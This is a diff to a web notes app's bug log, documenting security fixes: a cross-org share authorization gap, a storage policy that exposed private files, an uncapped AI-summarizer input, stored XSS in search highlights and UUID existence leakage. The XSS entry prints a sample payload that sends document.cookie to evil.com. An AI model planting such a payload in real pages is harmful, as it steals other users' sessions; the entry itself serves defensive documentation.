@@ -123,139 +123,96 @@ Update the response to a genric error message and fixed it.
 
 ---
 
-
----
-
-
 ## Visiting /org/create crashed the app with an infinite redirect loop
 
 **high** — fix `858a03f`
 
-When a freshly signed-up user (no org yet) visited `/org/create`, the page
-would never load — the browser just kept spinning and eventually showed
-"This site can't be reached." The terminal showed hundreds of rapid-fire
-requests per second.
 
-Why it happened: The `/org/create` page lives inside the `(app)` route
-group, which means the `(app)/layout.tsx` runs first for every request to
-that URL. That layout checks "does this user have any org memberships?"
-and if not, redirects to `/org/create`. So a new user with no org would:
+When a new user signs up for the app, they don't have an org yet. So the system redirects them to the create-org page. But the create-org page is inside the (app) route group, 
+which means the (app)/layout.tsx runs first for every request to that URL. 
+That layout checks "does this user have any org memberships?" and if not, redirects to /org/create. 
+Hence create an infinte loop of redirects.
 
-1. Land on `/org/create`
-2. Layout runs, finds no orgs, redirects to `/org/create`
-3. Layout runs again, finds no orgs, redirects again
-4. ... forever
+Removed redirect from layout and now when a user without an org visits /org/create 
+page it renders the page directly.
 
-Removed the redirect from the layout entirely. When `orgs.length === 0`
-the layout now renders the page content directly (the create-org page has
-its own full-screen card layout so it looks correct without the sidebar
-shell). All other app pages already have their own `if (!orgId)
-redirect("/org/create")` guard, so new users still get sent there when
-they try to access notes or the dashboard.
 
 ---
 
 
-## An admin of one org could list, inject, or revoke shares on notes they don't own
+## An admin of an org could list, inject, or revoke shares on notes they don't own
 
 **high** — fix `f0255b5`
 
-The `canManageShares` helper that gates all share actions (grant, revoke, list)
-fetched a note by its ID with no org filter. It then checked whether the
-caller was an admin of the `orgId` they passed in. These two checks were
-completely disconnected: an admin of org B could pass a noteId from org A
-and their own orgId, the note lookup would succeed (finding the org-A note),
-the membership check would pass (they are an admin — of org B), and the gate
-would return `true`.
-
-In practice this meant any org admin who could guess or discover a note UUID
-from another org could call `listSharesAction` to get the share recipient list
-for that note, `grantShareAction` to inject a share row into another org's
-note, or `revokeShareAction` to silently remove shares from a note they
-have no business touching.
+This meant any org admin could list, inject, or revoke shares on notes
+they don't own, as long as they could guess or discover a note UUID
+from another org.
 
 Added `.eq("org_id", orgId)` to the notes select inside `canManageShares`
 so the note lookup only succeeds if the note belongs to the same org the
-caller is operating in. A cross-org noteId now returns `false` immediately.
+caller is operating in. 
 
 
 ---
 
 
-## Files attached to private notes were downloadable by any org member via the Storage API
+## Files attached to private notes were downloadable by any org member
 
 **high** — fix `f0255b5`
 
-The Supabase Storage RLS SELECT policy for the `notes-files` bucket only
-checked that the caller was an org member and that the note wasn't deleted.
-It did not check note visibility. So an org member could take any file path
-(`<org_id>/<note_id>/<filename>`) and download it directly through the
-Storage API — even if the note was `private` and they had never been its
-author or a share recipient.
+Anyone could download files attached to private notes by guessing file paths.
+Issue was in RLS policy for storage bucket which did not check note visibility.
+It only checked whether user was an org member or not. The app was enforcing 
+org policies but the user can directly bypass it and download files using supabase storage api
+without going through our app.
 
-The application-layer download route (`/api/files/[fileId]/download`) was
-correctly enforcing visibility through the `files` table RLS, but that check
-could be bypassed entirely by calling the Supabase Storage endpoint directly.
 
 Replaced the SELECT policy (migration 0010) with one that mirrors the notes
 visibility model: the author always has access; org-wide notes are readable
 by any org member; private notes require an explicit `note_shares` row.
 
-
 ---
 
 
-## AI summarizer would send arbitrarily large notes to Anthropic with no size check
+## AI summarizer allows large notes to Anthropic with no size check
 
 **med** — fix `f0255b5`
 
-`generateSummary` concatenated the full note content into the API request
-with no length cap. A user could save a very large note and repeatedly call
-generate, sending hundreds of thousands of tokens to Anthropic per call.
-The same unbounded string was also the prompt-injection surface — a large
-enough note could push the system prompt framing out of the effective context
-window.
+Anyone can spam the summary api with no limit on note size.
+they could have a billion character note and spam it repeatedly.
 
-Added a 20,000-character hard cap before the API call so oversized notes are
-rejected with a clear error before any network request is made. Also wrapped
-the note content in `<note_content>` delimiter tags so injected instructions
-in the note body cannot syntactically escape the content role.
-
+Fixed it by adding a 20,000 character hard cap on note size. 
 
 ---
 
+## Search results could run attacker JavaScript in other users' browsers
 
-## org_id cookie was set without the secure flag, allowing transmission over HTTP
+**high** — fix `a324674`
 
-**low** — fix `f0255b5`
+When you search for notes, the app highlights the matching words in a snippet using Postgres's `ts_headline` function. The problem is that `ts_headline` doesn't HTML-escape the note content — it just wraps matched words in `<mark>` tags and returns everything else verbatim. The app then rendered that snippet directly into the DOM using `dangerouslySetInnerHTML`.
 
-Every place the `org_id` cookie was written — `createOrgAction`,
-`switchOrgAction`, and the app layout's mismatch correction — used
-`httpOnly: true, sameSite: "lax"` but omitted `secure: true`. In production,
-a network attacker on a non-HTTPS path (misconfigured redirect, HTTP fallback)
-could read or inject the cookie even though `requireOrgAccess` re-validates
-membership on every request.
+So if someone saved a note containing `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`, that tag would execute in the browser of any other org member who searched for a word in that note. Classic stored XSS — one person writes it, everyone else gets hit.
 
-Added `secure: process.env.NODE_ENV === "production"` to all three cookie
-writes so the flag is set in production but not in local dev where HTTPS
-is unavailable.
-
+Fixed by switching to control-character sentinels (`STX`/`ETX`) as the highlight markers instead of raw `<mark>` tags, HTML-escaping the entire snippet output, then substituting real `<mark>` tags back in. User content can't contain those control characters so they survive the escape chain unchanged.
 
 ---
 
+## uuid package crept back into production code after being banned
 
-## saveNoteAction UPDATE was not scoped by org_id unlike its sibling actions
+**low** — fix `ece63cf`
 
-**low** — fix `f0255b5`
+The `uuid` package was already banned in a prior BUGS.md entry because Postgres generates IDs better. It came back anyway — added to `package.json` dependencies and imported in `lib/notes/actions.ts` to mint note and version IDs before inserting them.
 
-`softDeleteNoteAction` and `changeVisibilityAction` both include
-`.eq("org_id", orgId)` on their UPDATE queries as defense-in-depth.
-`saveNoteAction`'s final UPDATE (setting `current_version_id`) only filtered
-by `id`. The prior `requireOrgAccess` check makes this unexploitable, but
-the inconsistency means a future regression that forgets the auth check would
-have no safety net at the DB layer.
+Removed it from production deps, replaced the three `uuidv4()` call sites with `insert().select('id').single()` so Postgres mints the IDs atomically on insert. The package stays in devDependencies because the test fixtures use it for stable test data.
 
-Added `.eq("org_id", orgId)` to match the pattern used everywhere else.
+---
 
+## File download route leaked whether a file ID existed in another org
+
+**low** — fix `7bba1db`
+
+The `/api/files/[fileId]/download` route returned a `403 Forbidden` when the file existed in a different org, and `404 Not Found` when the UUID didn't exist at all. That difference is enough to confirm whether any given UUID is a valid file somewhere in the system — just scan UUIDs and watch which error you get.
+
+The root cause was that `getFileInfo` used the admin (service-role) database client to fetch the file row by the caller-supplied ID before checking if the caller was allowed to see it. Fixed by switching the initial lookup to the user-scoped client, which enforces RLS and returns nothing for inaccessible files. Both "wrong org" and "doesn't exist" now look identical to the caller.
 
 ---
